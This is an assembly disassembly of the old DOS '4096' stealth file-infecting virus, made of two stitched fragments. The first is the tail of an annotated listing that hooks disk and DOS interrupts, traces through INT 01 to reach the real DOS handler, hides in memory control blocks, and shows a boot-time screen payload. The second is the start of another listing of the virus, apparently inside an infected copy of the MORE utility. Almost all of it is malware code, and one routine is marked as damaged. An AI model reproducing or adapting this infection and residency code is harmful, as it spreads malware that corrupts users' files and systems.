                and     cs:data_91,0FFFEh       ; (CS:12DB=0)
                cmp     byte ptr cs:data_90,0   ; (CS:12DA=0)
                jne     loc_75                  ; Jump if not equal
                push    cs:data_91              ; (CS:12DB=0)
                call    dword ptr cs:old_INT    ; (CS:122D=0)
                jnc     loc_76                  ; Jump if carry=0
                inc     cs:data_90              ; (CS:12DA=0)
loc_75:         stc                             ; Set carry flag
loc_76:         jmp     dword ptr cs:data_65    ; (CS:1241=0)

int_24:         xor     al,al                   ; Zero register
                mov     byte ptr cs:data_90,1   ; (CS:12DA=0)
                iret                            ; Interrupt return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_13          proc    near
                mov     byte ptr cs:data_90,0   ; (CS:12DA=0)
                call    sub_21                  ; Save REGS in vir's stack
                push    cs
                pop     ds
                mov     al,13h
                call    sub_1                   ; Get INT 13 vector
                mov     word ptr old_INT,bx     ; (CS:122D=0)
                mov     word ptr old_INT+2,es   ; (CS:122F=70h)
                mov     word ptr old_INT_13,bx  ; (CS:1239=0)
                mov     word ptr old_INT_13+2,es ; (CS:123B=70h)
                mov     dl,0
                mov     al,0Dh
                call    sub_1                   ; Get INT 0D vector
                mov     ax,es
                cmp     ax,0C000h
                jae     loc_77                  ; Jump if above or =
                mov     dl,2
loc_77:
                mov     al,0Eh
                call    sub_1                   ; Get INT 0E vector
                mov     ax,es
                cmp     ax,0C000h
                jae     loc_78                  ; Jump if above or =
                mov     dl,2
loc_78:
                mov     data_73,dl              ; (CS:1250=0)
                call    sub_22                  ; Set INT 01 for debuging
                mov     data_92,ss              ; (CS:12DD=151Ch)
                mov     data_93,sp              ; (CS:12DF=0)
                push    cs
                mov     ax,offset loc_79
                push    ax
                mov     ax,70h
                mov     es,ax
                mov     cx,0FFFFh
                mov     al,0CBh
                xor     di,di                   ; Zero register
                repne   scasb                   ; Rep zf=0+cx >0 Scan es:[di] for al
                dec     di
                pushf                           ; Push flags
                push    es
                push    di
                pushf                           ; Push flags
                pop     ax
                or      ah,1
                push    ax
                in      al,21h                  ; port 21h, 8259-1 int IMR
                mov     data_97,al              ; (CS:12E5=0)
                mov     al,0FFh
                out     21h,al                  ; port 21h, 8259-1 int comands
                popf                            ; Pop flags
                xor     ax,ax                   ; Zero register
                jmp     dword ptr old_INT       ; (CS:122D=0)
loc_79:
                lds     dx,old_INT_1            ; (CS:1231=0) Load 32 bit ptr
                mov     al,1
                call    sub_27                  ; Set INT 01 vector
                push    cs
                pop     ds
                mov     dx,offset int_13
                mov     al,13h
                call    sub_27                  ; Set INT 13 vector
                mov     al,24h
                call    sub_1                   ; Get INT 24 vector
                mov     word ptr old_INT_24,bx  ; (CS:123D=0)
                mov     word ptr old_INT_24+2,es ; (CS:123F=70h)
                mov     dx,offset int_24
                mov     al,24h
                call    sub_27                  ; Set INT 24 vector
                call    sub_20                  ; Restore regs from vir's stack
                retn
sub_13          endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_14          proc    near
                call    sub_21                  ; Save REGS in vir's stack
                lds     dx,dword ptr cs:old_INT_13 ; (CS:1239=0) Load 32 bit ptr
                mov     al,13h
                call    sub_27                  ; Set INT 13 vector
                lds     dx,dword ptr cs:old_INT_24 ; (CS:123D=0) Load 32 bit ptr
                mov     al,24h
                call    sub_27                  ; Set INT 24 vector
                call    sub_20                  ; Restore regs from vir's stack
                retn
sub_14          endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_15          proc    near
                mov     ax,3300h                ; Get CTRL-BREAK state
                call    sub_24                  ; INT 21
                mov     cs:data_94,dl           ; (CS:12E1) save state
                mov     ax,3301h
                xor     dl,dl                   ; Set CTRL-BREAK = OFF
                call    sub_24                  ; INT 21
                retn
sub_15          endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_16          proc    near
                mov     dl,cs:data_94           ; (CS:12E1)
                mov     ax,3301h                ; Restore CTRL-BREAK state
                call    sub_24                  ; INT 21
                retn
sub_16          endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_17          proc    near
                pop     cs:data_100             ; (CS:12EA=0)
                pushf                           ; Push flags
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                jmp     word ptr cs:data_100    ; (CS:12EA=0)
sub_17          endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_18          proc    near
                les     di,dword ptr cs:ptr_INT_21 ; (CS:1235=0) Load 32 bit ptr
                mov     si,offset data_70          ; (CS:124B=0)
                push    cs
                pop     ds
                cld                                ; Clear direction
                mov     cx,5

locloop_80:
                lodsb                           ; String [si] to al
                xchg    al,es:[di]
                mov     [si-1],al
                inc     di
                loop    locloop_80              ; Loop if cx > 0

                retn
sub_18          endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_19          proc    near
                pop     cs:data_100             ; (CS:12EA=0)
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf                            ; Pop flags
                jmp     word ptr cs:data_100    ; (CS:12EA=0)

;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_20:
                mov     cs:data_114,offset sub_19 ; (CS:135D=0) Restore REGS
                jmp     short loc_81              ; (0DF6)

;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_21:
                mov     cs:data_114,offset sub_17 ; (CS:135D=0) Save REGS
loc_81:         mov     cs:data_112,ss          ; (CS:1359=151Ch)
                mov     cs:data_111,sp          ; (CS:1357=0)
                push    cs
                pop     ss
                mov     sp,cs:data_113          ; (CS:135B=0)
                call    word ptr cs:data_114    ; (CS:135D=0)
                mov     cs:data_113,sp          ; (CS:135B=0)
                mov     ss,cs:data_112          ; (CS:1359=151Ch)
                mov     sp,cs:data_111          ; (CS:1357=0)
                retn
sub_19          endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_22          proc    near
                mov     al,1
                call    sub_1                      ; Get INT 01 vector
                mov     word ptr cs:old_INT_1,bx   ; (CS:1231=0)
                mov     word ptr cs:old_INT_1+2,es ; (CS:1233=70h)
                push    cs
                pop     ds
                mov     dx,offset debug
                call    sub_27                     ; Set INT 01 vector
                retn
sub_22          endp

_21_48:         call    sub_23          ; (0E3A)
                jmp     loc_10          ; (030F)

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_23          proc    near
                cmp     byte ptr cs:data_95,0   ; (CS:12E2=0)
                je      loc_ret_83              ; Jump if equal
                cmp     bx,0FFFFh
                jne     loc_ret_83              ; Jump if not equal
                mov     bx,160h
                call    sub_24                  ; INT 21
                jc      loc_ret_83              ; Jump if carry Set
                mov     dx,cs
                cmp     ax,dx
                jb      loc_82                  ; Jump if below
                mov     es,ax
                mov     ah,49h
                call    sub_24                  ; INT 21
                jmp     short loc_ret_83        ; (0E8A)
loc_82:
                dec     dx
                mov     ds,dx
                mov     word ptr ds:MCB_0001,0  ; (7DBC:0001=275h)
                inc     dx
                mov     ds,dx
                mov     es,ax
                push    ax
                mov     cs:data_72,ax           ; (CS:124E=7DBDh)
                xor     si,si                   ; Zero register
                mov     di,si
                mov     cx,all_len/2
                rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
                dec     ax
                mov     es,ax
                mov     ax,cs:data_69           ; (CS:1249=0)
                mov     es:MCB_0001,ax          ; (48FF:0001=0FFFFh)
                mov     ax,offset loc_ret_83
                push    ax
                retf
loc_ret_83:     retn
sub_23          endp

_21_37:         mov     byte ptr cs:data_104,2  ; (CS:12F0=0)
                jmp     loc_10                  ; (030F)

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_24          proc    near                    ; calls INT 21
                pushf
                call    dword ptr cs:ptr_INT_21 ; (CS:1235=0)
                retn
sub_24          endp

boot:           cli                             ; Disable interrupts
                xor     ax,ax                   ; Zero register
                mov     ss,ax
                mov     sp,7C00h
                jmp     short loc_85            ; (0EF4)

data1           db      0dbh,0dbh,0dbh, 20h
data2           db      0f9h,0e0h,0e3h,0c3h
                db       80h, 81h, 11h, 12h, 24h, 40h, 81h, 11h
                db       12h, 24h, 40h,0F1h,0F1h, 12h, 24h, 40h
                db       81h, 21h, 12h, 24h, 40h, 81h, 10h,0e3h
                db      0C3h, 80h, 00h, 00h, 00h, 00h, 00h, 00h
                db       00h, 00h, 00h, 00h, 82h, 44h,0F8h, 70h
                db      0C0h, 82h, 44h, 80h, 88h,0C0h, 82h, 44h
                db       80h, 80h,0C0h, 82h, 44h,0F0h, 70h,0C0h
                db       82h, 28h, 80h, 08h,0C0h, 82h, 28h, 80h
                db       88h, 00h,0F2h, 10h,0F8h, 70h,0C0h

loc_85:         push    cs
                pop     ds
                mov     dx,0B000h
                mov     ah,0Fh
                int     10h                     ; Video display   ah=functn 0Fh
                                                ;  get state, al=mode, bh=page
                cmp     al,7
                je      loc_86                  ; Jump if equal
                mov     dx,0B800h
loc_86:
                mov     es,dx
                cld                             ; Clear direction
                xor     di,di                   ; Zero register
                mov     cx,7D0h
                mov     ax,720h
                rep     stosw                   ; Rep when cx >0 Store ax to es:[di]
                mov     si,data2-boot+7C00h     ; (CS:7C0E=0)
                mov     bx,2AEh
loc_87:
                mov     bp,5
                mov     di,bx
loc_88:
                lodsb                           ; String [si] to al
                mov     dh,al
                mov     cx,8

locloop_89:
                mov     ax,720h
                shl     dx,1                    ; Shift w/zeros fill
                jnc     loc_90                  ; Jump if carry=0
                mov     al,0DBh
loc_90:
                stosw                           ; Store ax to es:[di]
                loop    locloop_89              ; Loop if cx > 0

                dec     bp
                jnz     loc_88                  ; Jump if not zero
                add     bx,0A0h
                cmp     si,loc_85-boot+7C00h
                jb      loc_87                  ; Jump if below
                mov     ah,1
                int     10h                     ; Video display   ah=functn 01h
                                                ;  set cursor mode in cx
                mov     al,8
                mov     dx,loc_911-boot+7C00h
                call    sub_27                  ; Set INT 08 vector
                mov     ax,7FEh
                out     21h,al                  ; port 21h, 8259-1 int comands
                                                ;  al = 0FEh, IRQ0 (timer) only
                sti                             ; Enable interrupts
                xor     bx,bx                   ; Zero register
                mov     cx,1
loc_91:         jmp     short loc_91            ; SLEEP!!!
loc_911:        dec     cx                      ; INT 08 handler
                jnz     loc_92                  ; Jump if not zero
                xor     di,di                   ; Zero register
                inc     bx
                call    sub_25                  ; (0F67)
                call    sub_25                  ; (0F67)
                mov     cl,4
loc_92:
                mov     al,20h                  ; ' '
                out     20h,al                  ; port 20h, 8259-1 int command
                                                ;  al = 20h, end of interrupt
                iret                            ; Interrupt return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_25          proc    near
                mov     cx,28h

locloop_93:
                call    sub_26                  ; (0F93)
                stosw                           ; Store ax to es:[di]
                stosw                           ; Store ax to es:[di]
                loop    locloop_93              ; Loop if cx > 0

add1:           add     di,9Eh      ; sub di,9Eh
                mov     cx,17h

locloop_94:
                call    sub_26                  ; (0F93)
                stosw                           ; Store ax to es:[di]
add2:           add     di,9Eh      ; sub di,9Eh
                loop    locloop_94              ; Loop if cx > 0

setd:           std                             ; Set direction flag
_setd           equ     setd - boot + 7c00h
                xor     byte ptr ds:[_setd],1   ; (CS:7CE7=0)
_add1           equ     add1 - boot + 7c01h
                xor     byte ptr ds:[_add1],28h ; (CS:7CD7=0) '('
_add2           equ     add2 - boot + 7c01h
                xor     byte ptr ds:[_add2],28h ; (CS:7CE2=0) '('
                retn
sub_25          endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_26          proc    near
                and     bx,3
_data1          equ     data1 - boot + 7c00h
                mov     al,byte ptr ds:[_data1+bx]       ; (CS:7C0A=0)
                inc     bx
                retn
sub_26          endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_27          proc    near
                push    es
                push    bx
                xor     bx,bx                   ; Zero register
                mov     es,bx
                mov     bl,al
                shl     bx,1                    ; Shift w/zeros fill
                shl     bx,1                    ; Shift w/zeros fill
                mov     es:[bx],dx
                mov     es:[bx+2],ds
                pop     bx
                pop     es
                retn
sub_27          endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                     SUBROUTINE - *** DAMAGED BY STACK ***
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_28          proc    near
                call    sub_13                  ; (0CC6)
                mov     dl,1
                add     [bp+si-4F2h],bl
                pop     es
                jo      $+2                     ; Jump if overflow=1
                xor     cx,word ptr ds:[32Eh]   ; (0000:032E=0)
                push    di
                sbb     [bp+di],al
                add     byte ptr ds:[0],ah      ; (0000:0000=5Bh)
                add     [bx+di],ah
                add     [bx+si+12h],dl
                sbb     dx,[bx]
                loopnz  $+11h                   ; Loop if zf=0, cx>0
                jnp     $+23h                   ; Jump if not parity
                db      0C1h, 02h, 31h, 41h, 7Ah, 16h
                db       01h, 1Fh, 9Ah, 0Eh,0FBh, 07h
                db       70h, 00h, 33h, 0Eh, 2Eh, 03h
                db       57h, 18h, 57h, 1Fh,0A9h, 80h
                db       00h, 00h, 57h, 1Fh
sub_28          endp

                org     1200h

data_38         dw      ?
data_40         dw      ?
data_41         dw      ?, ?
data_42         dw      ?
data_43         dw      ?
data_44         dw      ?
data_45         dw      ?
data_46         dw      ?, ?
data_48         dw      ?
data_49         dw      ?
                db      12 dup (?)
prm_blck_adr    dw      ?, ?
data_52         db      ?
data_53         dw      ?
data_54         dw      ?
old_INT         dd      ?
old_INT_1       dd      ?
ptr_INT_21      dd      ?
old_INT_13      dd      ?
old_INT_24      dd      ?
data_65         dd      ?
old_DS          dw      ?
data_68         dw      ?
data_69         dw      ?
data_70         db      ?
data_71         dw      ?
data_72         dw      ?
data_73         db      ?
data_74         db      ?
data_75         db      50h dup (?)
data_76         db      ?
data_77         dw      ?
data_78         dw      ?
data_79         dw      ?
data_80         dw      ?
data_81         dw      ?
data_82         dw      ?
data_83         dw      ?
data_84         dw      ?
data_85         dw      ?
data_86         db      0Eh dup (?)
data_87         dw      ?
data_88         dd      ?
                db      ?
data_89         db      10h dup (?)
data_90         db      ?
data_91         dw      ?
data_92         dw      ?
data_93         dw      ?
data_94         db      ?
data_95         db      ?
old_AX          dw      ?
data_97         db      ?
data_98         dw      ?
data_99         dw      ?
data_100        dw      ?
data_101        dw      ?
dos_ver         db      ?
data_103        db      ?
data_104        db      ?
exec_block      db      0Eh dup (?)
data_106        dw      ?
data_107        dw      ?
entry_point     dd      ?
file_name       db      50h dup (?)
data_111        dw      ?
data_112        dw      ?
data_113        dw      ?
data_114        dw      ?

seg_a           ends

                end

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

PAGE  59,132
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                      ;;
;;;                 4096                         ;;
;;;                                      ;;
;;;      Created:   1-Jan-80                             ;;
;;;      Version:                                ;;
;;;      Passes:    5          Analysis Options on: none             ;;
;;;                                      ;;
;;;                                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
data_1e     equ 0Ah         ; (0000:000A=0E6h)
data_3e     equ 12h         ; (0000:0012=70h)
data_4e     equ 14h         ; (0000:0014=0FF54h)
data_5e     equ 18h         ; (0000:0018=0EB52h)
data_6e     equ 1Ah         ; (0000:001A=0F000h)
data_7e     equ 0FD9Fh          ; (0000:FD9F=19B4h)
data_8e     equ 0FDA1h          ; (0000:FDA1=21CDh)
data_9e     equ 0FDA3h          ; (0000:FDA3=0B450h)
data_10e    equ 0Ah         ; (068A:000A=6E41h)
data_12e    equ 0FD9Fh          ; (068A:FD9F=6580h)
data_13e    equ 0FDA1h          ; (068A:FDA1=0C004h)
data_14e    equ 0FDA3h          ; (068A:FDA3=8026h)
data_15e    equ 0           ; (3A6A:0000=0FFh)
data_16e    equ 1           ; (3A6A:0001=0FFFFh)
data_17e    equ 3           ; (3A6A:0003=0FFFFh)
data_18e    equ 0           ; (3BCB:0000=0FFh)
data_19e    equ 1           ; (3BCB:0001=0FFFFh)
data_20e    equ 3           ; (3BCB:0003=0FFFFh)
data_21e    equ 2           ; (3BCC:0002=0)
data_22e    equ 4           ; (3BCC:0004=0)
data_23e    equ 6           ; (3BCC:0006=0)
data_24e    equ 8           ; (3BCC:0008=0)
data_25e    equ 0Ah         ; (3BCC:000A=0)
data_26e    equ 12h         ; (3BCC:0012=0)
data_27e    equ 14h         ; (3BCC:0014=0)
data_28e    equ 18h         ; (3BCC:0018=0)
data_30e    equ 20h         ; (3BCC:0020=0)
data_58e    equ 1224h           ; (3BCC:1224=0)
data_60e    equ 1228h           ; (3BCC:1228=0)
data_61e    equ 1229h           ; (3BCC:1229=0)
data_62e    equ 122Bh           ; (3BCC:122B=0)
data_63e    equ 122Dh           ; (3BCC:122D=0)
data_65e    equ 1231h           ; (3BCC:1231=0)
data_67e    equ 1235h           ; (3BCC:1235=0)
data_69e    equ 1239h           ; (3BCC:1239=0)
data_71e    equ 123Dh           ; (3BCC:123D=0)
data_73e    equ 1241h           ; (3BCC:1241=0)
data_75e    equ 1245h           ; (3BCC:1245=3BCCh)
data_76e    equ 1247h           ; (3BCC:1247=0)
data_77e    equ 1249h           ; (3BCC:1249=0)
data_78e    equ 124Bh           ; (3BCC:124B=0)
data_79e    equ 124Ch           ; (3BCC:124C=0)
data_80e    equ 124Eh           ; (3BCC:124E=3BCCh)
data_81e    equ 1250h           ; (3BCC:1250=0)
data_82e    equ 1251h           ; (3BCC:1251=0)
data_83e    equ 1252h           ; (3BCC:1252=0)
data_84e    equ 12A2h           ; (3BCC:12A2=0)
data_85e    equ 12A3h           ; (3BCC:12A3=0)
data_86e    equ 12A5h           ; (3BCC:12A5=0)
data_87e    equ 12A7h           ; (3BCC:12A7=0)
data_88e    equ 12A9h           ; (3BCC:12A9=0)
data_89e    equ 12ABh           ; (3BCC:12AB=0)
data_90e    equ 12ADh           ; (3BCC:12AD=0)
data_91e    equ 12AFh           ; (3BCC:12AF=0)
data_92e    equ 12B1h           ; (3BCC:12B1=0)
data_93e    equ 12B3h           ; (3BCC:12B3=0)
data_94e    equ 12B5h           ; (3BCC:12B5=0)
data_95e    equ 12DAh           ; (3BCC:12DA=0)
data_96e    equ 12DBh           ; (3BCC:12DB=0)
data_97e    equ 12DDh           ; (3BCC:12DD=0EF4h)
data_98e    equ 12DFh           ; (3BCC:12DF=0)
data_99e    equ 12E1h           ; (3BCC:12E1=0)
data_100e   equ 12E2h           ; (3BCC:12E2=0)
data_101e   equ 12E3h           ; (3BCC:12E3=0)
data_102e   equ 12E5h           ; (3BCC:12E5=0)
data_103e   equ 12E6h           ; (3BCC:12E6=0)
data_104e   equ 12E8h           ; (3BCC:12E8=0)
data_105e   equ 12EAh           ; (3BCC:12EA=0)
data_106e   equ 12ECh           ; (3BCC:12EC=0)
data_107e   equ 12EEh           ; (3BCC:12EE=0)
data_108e   equ 12EFh           ; (3BCC:12EF=0)
data_109e   equ 12F0h           ; (3BCC:12F0=0)
data_110e   equ 12F1h           ; (3BCC:12F1=0)
data_111e   equ 12FFh           ; (3BCC:12FF=0)
data_112e   equ 1301h           ; (3BCC:1301=0)
data_113e   equ 1303h           ; (3BCC:1303=0)
data_115e   equ 1307h           ; (3BCC:1307=0)
data_116e   equ 1357h           ; (3BCC:1357=0)
data_117e   equ 1359h           ; (3BCC:1359=0EF4h)
data_118e   equ 135Bh           ; (3BCC:135B=0)
data_119e   equ 135Dh           ; (3BCC:135D=0)
data_120e   equ 15FEh           ; (3BCC:15FE=0)
data_121e   equ 7C0Ah           ; (3BCC:7C0A=0)
data_122e   equ 7C0Eh           ; (3BCC:7C0E=0)
data_123e   equ 7CD7h           ; (3BCC:7CD7=0)
data_124e   equ 7CE2h           ; (3BCC:7CE2=0)
data_125e   equ 7CE7h           ; (3BCC:7CE7=0)
data_126e   equ 8B4Bh           ; (3BCC:8B4B=0)
data_127e   equ 1           ; (48FF:0001=0)
data_128e   equ 1           ; (5200:0001=0)
  
seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a
  
  
        org 100h
  
4096        proc    far
  
start:
        jmp loc_19          ; (0488)
        and [si],dx
        pop cx
        cmp ax,200h
        jae loc_1           ; Jump if above or =
        mov dx,offset data_41   ; (3BCC:01FC=4Dh)
        mov ah,9
        int 21h         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        int 20h         ; Program Terminate
loc_1:
        mov byte ptr data_35,19h    ; (3BCC:01E7=18h)
        mov ah,0Fh
        int 10h         ; Video display   ah=functn 0Fh
                        ;  get state, al=mode, bh=page
        mov data_36,ah      ; (3BCC:01E8=50h)
        mov dx,offset data_41+1Bh   ; (3BCC:0217=0Dh)
        mov ah,9
        int 21h         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        xor bx,bx           ; Zero register
        mov ah,45h          ; 'E'
        int 21h         ; DOS Services  ah=function 45h
                        ;  duplicate handle bx, ax=new #
        mov bp,ax
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        mov bx,2
        mov ah,45h          ; 'E'
        int 21h         ; DOS Services  ah=function 45h
                        ;  duplicate handle bx, ax=new #
loc_2:
        cld             ; Clear direction
        mov dx,offset data_43   ; (3BCC:021A=0)
        mov cx,1000h
        mov bx,bp
        mov ah,3Fh          ; '?'
        int 21h         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        or  ax,ax           ; Zero ?
        jnz loc_4           ; Jump if not zero
loc_3:
        int 20h         ; Program Terminate
loc_4:
        mov cx,ax
        mov si,dx
loc_5:
        lodsb               ; String [si] to al
        cmp al,1Ah
        je  loc_3           ; Jump if equal
        cmp al,0Dh
        jne loc_6           ; Jump if not equal
        mov byte ptr data_38,1  ; (3BCC:01EA=1)
        jmp short loc_10        ; (01AE)
loc_6:
        cmp al,0Ah
        jne loc_7           ; Jump if not equal
        inc data_37         ; (3BCC:01E9=1)
        jmp short loc_10        ; (01AE)
loc_7:
        cmp al,8
        jne loc_8           ; Jump if not equal
        cmp byte ptr data_38,1  ; (3BCC:01EA=1)
        je  loc_10          ; Jump if equal
        dec data_38         ; (3BCC:01EA=1)
        jmp short loc_10        ; (01AE)
loc_8:
        cmp al,9
        jne loc_9           ; Jump if not equal
        mov ah,data_38      ; (3BCC:01EA=1)
        add ah,7
        and ah,0F8h
        inc ah
        mov data_38,ah      ; (3BCC:01EA=1)
        jmp short loc_10        ; (01AE)
loc_9:
        cmp al,7
        je  loc_10          ; Jump if equal
        inc data_38         ; (3BCC:01EA=1)
        mov ah,data_38      ; (3BCC:01EA=1)
        cmp ah,data_36      ; (3BCC:01E8=50h)
        jbe loc_10          ; Jump if below or =
        inc data_37         ; (3BCC:01E9=1)
        mov byte ptr data_38,1  ; (3BCC:01EA=1)
loc_10:
        mov dl,al
        mov ah,2
        int 21h         ; DOS Services  ah=function 02h
                        ;  display char dl
        mov ah,data_37      ; (3BCC:01E9=1)
        cmp ah,data_35      ; (3BCC:01E7=18h)
        jb  loc_11          ; Jump if below
        mov dx,offset data_39   ; (3BCC:01F0=0Dh)
        mov ah,9
        int 21h         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        mov ah,0Ch
        mov al,1
        int 21h         ; DOS Services  ah=function 0Ch
                        ;  clear keybd buffer & input al
        mov dx,offset data_41+1Bh   ; (3BCC:0217=0Dh)
        mov ah,9
        int 21h         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        mov byte ptr data_38,1  ; (3BCC:01EA=1)
        mov byte ptr data_37,1  ; (3BCC:01E9=1)
        dec si
        inc cx
loc_11:
        dec cx
        jz  loc_12          ; Jump if zero
        jmp loc_5           ; (0152)
loc_12:
        jmp loc_2           ; (013B)
data_35     db  18h
data_36     db  50h
data_37     db  1
data_38     db  1
        db  0, 0, 0, 0, 0
data_39     db  0Dh, '-- More --$'
data_41     db  'MORE: Incorrect DOS version', 0Dh
        db  0Ah, '$'
data_43     dw  0, 0, 0
        db   00h,0E9h,0A7h, 00h,0B4h, 30h
        db  0CDh, 21h, 86h,0E0h, 3Dh, 00h
        db   02h, 73h, 09h,0BAh,0FCh, 01h
        db  0B4h, 09h,0CDh, 21h,0CDh, 20h
        db  0C6h, 06h,0E7h, 01h, 19h,0B4h
        db   0Fh,0CDh, 00h,0FEh, 3Ah, 55h
        db   8Bh,0ECh, 50h, 81h, 7Eh, 04h
        db   00h,0C0h, 73h, 0Ch, 2Eh,0A1h
        db   47h, 12h, 39h, 46h, 04h, 76h
        db   03h
loc_13:
        pop ax
        pop bp
        iret                ; Interrupt return
        db   2Eh, 80h, 3Eh, 50h, 12h, 01h
        db   74h, 32h, 8Bh, 46h, 04h, 2Eh
        db  0A3h, 2Fh, 12h, 8Bh, 46h, 02h
        db   2Eh,0A3h, 2Dh, 12h, 72h, 15h
        db   58h, 5Dh, 2Eh, 8Eh, 16h,0DDh
        db   12h, 2Eh, 8Bh, 26h,0DFh, 12h
        db   2Eh,0A0h,0E5h, 12h,0E6h, 21h
        db  0E9h,0D9h
        db  0Ch
loc_14:
        and word ptr [bp+6],0FEFFh
        mov al,cs:data_102e     ; (3BCC:12E5=0)
        out 21h,al          ; port 21h, 8259-1 int comands
        jmp short loc_13        ; (0257)
loc_15:
        dec byte ptr cs:data_82e    ; (3BCC:1251=0)
        jnz loc_13          ; Jump if not zero
        and word ptr [bp+6],0FEFFh
        call    sub_21          ; (100F)
        call    sub_18          ; (0FDA)
        lds dx,dword ptr cs:data_65e    ; (3BCC:1231=0) Load 32 bit ptr
        mov al,1
        call    sub_27          ; (11BC)
        call    sub_20          ; (1006)
        jmp short loc_14        ; (0287)
  
4096        endp
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
